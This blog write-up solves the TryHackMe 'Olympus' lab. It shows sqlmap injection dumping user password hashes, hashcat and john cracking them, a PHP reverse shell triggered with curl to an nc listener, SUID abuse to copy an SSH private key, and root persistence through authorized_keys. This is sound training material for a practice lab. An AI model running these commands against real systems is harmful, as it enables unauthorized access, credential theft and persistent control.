---
title: "TryHackMe: Olympus"
author: cilgin
date: 2025-06-29 19:51:50 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Medium]
pin: true
math: false
mermaid: false
image:
  path: /assets/img/2025-06-29-TryHackMe-Olympus/main.png
---

Hey everyone!

Welcome to another adventure. Today, we're setting our sights on the heavens and attempting to conquer the **[Olympus](https://tryhackme.com/room/olympusroom)** room on TryHackMe. Let's grab our gear, set our IP, and get ready to challenge the gods

---

First things first, let's set our target's IP address as an environment variable. It just makes life easier, trust me.

```bash
export IP=10.10.85.12
```

### Reconnaissance: The All-Seeing Eye of Nmap

Time for our trusty sidekick, `nmap`, to do its thing. We'll run a scan for all ports (`-p-`) and try to figure out what services and versions are running.

```bash
❯ nmap -A -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-29 20:08 +0300
Nmap scan report for olympus.thm (10.10.85.12)
Host is up (0.066s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:d5:56:cd:de:f2:25:02:3f:ac:8f:1f:13:93:87:da (RSA)
|   256 8e:79:67:bf:ba:b3:01:9a:47:00:ca:c1:28:8c:79:7a (ECDSA)
|_  256 a1:ae:62:c2:24:94:4d:d3:b6:c8:30:87:76:a6:10:fe (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Olympus
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 611.24 seconds
```

Alright, we've got two open ports: **SSH (22)** and **HTTP (80)**. Since we don't have any credentials yet, let's start by exploring the website on port 80.

When I tried to visit the IP address in my browser, it redirected me to `olympus.thm`. This means we need to tell our computer how to find `olympus.thm`. Let's edit our `/etc/hosts` file and add the following line:

```
10.10.85.12 olympus.thm
```

Now, let's see what the website has in store for us.

![Desktop View](/assets/img/2025-06-29-TryHackMe-Olympus/photo1.png){: width="972" height="589" }

The site is under development, but it kindly points us to an "old version" located at a different domain. The message is a bit cryptic, but it hints that we should look for subdomains.

### Fuzzing for Gold with Gobuster

My first instinct was to fuzz for subdomains, but that turned up empty. Sometimes the simplest path is the right one! Instead, let's fuzz for directories on the main site. We'll use `gobuster` with a common wordlist and check for popular file extensions.

```bash
❯ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://olympus.thm/ -x md,js,html,php,py,css,txt -t 50
===============================================================
Gobuster v3.6
...
===============================================================
/index.php            (Status: 200) [Size: 1948]
/javascript           (Status: 301) [Size: 315] [--> http://olympus.thm/javascript/]
/phpmyadmin           (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
/static               (Status: 301) [Size: 311] [--> http://olympus.thm/static/]
/~webmaster           (Status: 301) [Size: 315] [--> http://olympus.thm/~webmaster/]
...
===============================================================
```

Aha! We found `phpmyadmin` (Forbidden, but we'll keep it in mind) and, more interestingly, a `~webmaster` directory. The tilde `~` often indicates a user's public web directory. This must be the "old version" the homepage was talking about! Let's go exploring.

Navigating to `http://olympus.thm/~webmaster/` reveals a blog. Time to fuzz this directory for more secrets.

```bash
❯ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://olympus.thm/~webmaster/ -x md,js,html,php,py,css,txt -t 50
===============================================================
Gobuster v3.6
...
===============================================================
/LICENSE              (Status: 200) [Size: 1070]
/README.md            (Status: 200) [Size: 2146]
/admin                (Status: 301) [Size: 321] [--> http://olympus.thm/~webmaster/admin/]
/category.php         (Status: 200) [Size: 6650]
/css                  (Status: 301) [Size: 319] [--> http://olympus.thm/~webmaster/css/]
...
/search.php           (Status: 200) [Size: 6621]
...
===============================================================
```

We hit the jackpot! An `/admin` panel and a `search.php` file. The admin panel seems like a good target, but let's fuzz it quickly to see what's inside.

```bash
❯ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://olympus.thm/~webmaster/admin/ -x md,js,html,php,py,css,txt -t 50
===============================================================
Gobuster v3.6
...
===============================================================
/categories.php       (Status: 302) [Size: 9799] [--> ../index.php]
/comment.php          (Status: 302) [Size: 7778] [--> ../index.php]
/function.php         (Status: 200) [Size: 0]
/index.php            (Status: 302) [Size: 11408] [--> ../index.php]
...
===============================================================
```

Most of these files redirect us back to the main site, likely because we aren't authenticated. Bummer. But wait, what about that `search.php`? Search fields are a classic entry point for SQL Injection.

A quick Google search for "Victor CMS vulnerabilities" (a guess based on the site's structure) leads us to this little gem on Exploit-DB:

**[Victor CMS 1.0 - 'search' SQL Injection (Unauthenticated)](https://www.exploit-db.com/exploits/48734)**

Let's see if we can use `sqlmap` to exploit this.

### SQL Injection: Fishing for Data

We'll use the exploit's proof-of-concept to craft our `sqlmap` command. The goal is to see what databases are on the server.

```bash
❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" --dbs --random-agent -v 3
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.4#stable}
...
available databases [6]:
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys
```

Success! The `olympus` database looks very promising. Let's see what tables it holds.

```bash
❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" --dbs --random-agent -v 3 -D olympus --tables
...
Database: olympus
[6 tables]
+------------+
| categories |
| chats      |
| comments   |
| flag       |
| posts      |
| users      |
+------------+
```

A `flag` table and a `users` table? It's like Christmas morning! Let's get the flag first.

```bash
❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" -D olympus -T flag --dump
...
Database: olympus
Table: flag
[1 column]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(255) |
+--------+--------------+
[1 entry]
+---------------------------+
| flag                      |
+---------------------------+
| flag{*******************} |
+---------------------------+
```

One flag down! Now, for the user credentials. This could be our key to getting a shell.

```bash
❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" -D olympus -T users --dump
...
Database: olympus
Table: users
[3 entries]
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| user_id | randsalt | user_name  | user_role | user_email             | user_image | user_lastname | user_password                                                | user_firstname |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| 3       | <blank>  | prometheus | User      | prometheus@olympus.thm | <blank>    | <blank>       | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | prometheus     |
| 6       | dgas     | root       | Admin     | root@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | root           |
| 7       | dgas     | zeus       | User      | zeus@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | zeus           |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
```

Look at that! We have three users, their hashed passwords, and a very interesting clue: the `root` and `zeus` users have emails at `chat.olympus.thm`. This is the subdomain we were looking for! My initial wordlist was too small; a lesson in using bigger and better wordlists.

Let's add `chat.olympus.thm` to our `/etc/hosts` file:

```
10.10.85.12 olympus.thm chat.olympus.thm
```

### Cracking the Gates and Getting a Shell

Navigating to `http://chat.olympus.thm` brings us to a login page.

![Desktop View](/assets/img/2025-06-29-TryHackMe-Olympus/photo3.png){: width="972" height="589" }

We have usernames and hashed passwords. The `$2y$` prefix on the hashes indicates they are **bcrypt**, a strong and slow hashing algorithm. Let's fire up `hashcat` and see if we can crack these against the `rockyou.txt` wordlist.

```bash
❯ hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
...
$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C:*********

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2...Dvnj3C
```

Success! We cracked the password for the user `prometheus`. The other hashes were too strong for `rockyou.txt`, but one is all we need. Let's log in.

![Desktop View](/assets/img/2025-06-29-TryHackMe-Olympus/photo4.png){: width="972" height="589" }

We're in! And there's a file upload feature. This is our ticket to a reverse shell. The plan is:

1.  Create a PHP reverse shell.
2.  Upload it.
3.  Find where it's stored and what it's named.
4.  Execute it.

After uploading a test file, I couldn't find it. It seems the application renames uploaded files. But wait... remember the `chats` table we found earlier? Let's go back to our SQL injection and see what's in there. It might contain a log of the file uploads!

```bash
❯ sqlmap -u 'http://olympus.thm/~webmaster/search.php?id=1' --data="search=1337*&submit=" -D olympus -T chats --dump
...
Database: olympus
Table: chats
[13 entries]
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
| dt         | msg                                                                                                                                                             | uname      | file                                 |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | prometheus | 47c3210d51761686f3af40a875eeaaea.txt |
| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | prometheus | <blank>                              |
| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | zeus       | <blank>                              |
...
| 2025-06-30 | Attached : shell.php                                                                                                                                            | prometheus | 566295ce0926ec7f6fbc9ccea2f254ca.php |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+--------------------------------------+
```

Bingo! The `file` column contains the randomized filename. The chats confirm our suspicion: "The IT guy used a random file name function." Not random enough, it seems!

I uploaded my PHP reverse shell (I used the one from Pentestmonkey), ran the `sqlmap` command again to get its new name, and then triggered it with `curl` from my terminal.

Set up a listener on your machine: `nc -lvnp 4444`
Then, trigger the shell:

```bash
❯ curl http://chat.olympus.thm/uploads/566295ce0926ec7f6fbc9ccea2f254ca.php
```

And just like that, we have a shell!

### Privilege Escalation: Climbing Mount Olympus

First, let's upgrade our shell to something more stable and interactive.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
# Press Ctrl+Z to background
stty raw -echo; fg
reset
```

Now, let's poke around. In `/home/zeus`, we find the user flag and an interesting text file.

```bash
www-data@ip-10-10-85-12:/home/zeus$ cat user.flag
flag{***************************}
www-data@ip-10-10-85-12:/home/zeus$ cat zeus.txt
Hey zeus !


I managed to hack my way back into the olympus eventually.
Looks like the IT kid messed up again !
I've now got a permanent access as a super user to the olympus.



						- Prometheus.
```

Wow, Prometheus, you're more than just a metrics server! This note gives us a hint that there's a way to become a "super user." Time for some enumeration. Running `linpeas.sh` is always a good idea.

After some digging, I found a binary with the SUID bit set. This is a huge red flag! SUID allows a user to execute a file with the permissions of the file owner.

```bash
www-data@ip-10-10-85-12:/$ ls -la /usr/bin/cputils
-rwsr-xr-x 1 zeus zeus 17728 Apr 18  2022 /usr/bin/cputils
```

The binary is owned by `zeus` and we can execute it. It seems to be a custom utility for copying files. We can use this to copy Zeus's private SSH key from his home directory to a place we can read it, like `/tmp`.

```bash
www-data@ip-10-10-85-12:/$ /usr/bin/cputils
  ____ ____        _   _ _
 / ___|  _ \ _   _| |_(_) |___
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/

Enter the Name of Source File: /home/zeus/.ssh/id_rsa
Enter the Name of Target File: /tmp/id_rsa

File copied successfully.
```

I copied the key over to my machine, but when I tried to log in, it was protected by a passphrase. Drat! No problem, `john` can handle this.

First, convert the key to a format `john` can understand using `ssh2john`. Then, crack it.

```bash
# On your local machine
ssh2john id_rsa > ssh.hash
john --wordlist=rockyou.txt ssh.hash
john --show ssh.hash
key:**********
```

With the passphrase in hand, we can now SSH in as `zeus`.

### To the Summit: Root!

Once logged in as `zeus`, it's time for more enumeration. After looking around, I found a suspicious file in `/var/www/html/`. It was a PHP backdoor left behind by someone.

Looking at the code, it executes a very specific command: `uname -a; w; /lib/defended/libc.so.99`. Let's see what happens when we run that last part ourselves.

```bash
zeus@ip-10-10-85-12:~$ uname -a; w; /lib/defended/libc.so.99
whoami
root
```

We have a root shell! It seems this library was another SUID binary or part of a misconfigured cron job that elevates our privileges. Let's grab the final flag.

```bash
cat /root/root.flag
                    ### Congrats !! ###
...
                You did it, you defeated the gods.
                        Hope you had fun !

                   flag{******************)_}

PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)

                  (Hint : regex can be usefull)
```

### The Bonus Round: Prometheus's Secret

The note mentions a bonus flag and suggests using regex. Let's become root properly. As `zeus`, I added my public SSH key to `/root/.ssh/authorized_keys`, then SSH'd in directly as root.

Now, for the hunt. The hint suggests using `grep` to find any file containing the string `flag{`.

```bash
# A safer way to search the whole system
cd /
grep -irl "flag{"
```

After a short wait, it points us to a hidden file:

```bash
root@ip-10-10-85-12:/# cat /etc/ssl/private/.b0nus.fl4g
Here is the final flag ! Congrats !

flag{*****************}


As a reminder, here is a usefull regex :

grep -irl flag{



Hope you liked the room ;)
```

And that's it! We've conquered Olympus, defeated the gods, and even found Prometheus's secret stash. What a climb! Thanks for reading, and happy hacking!
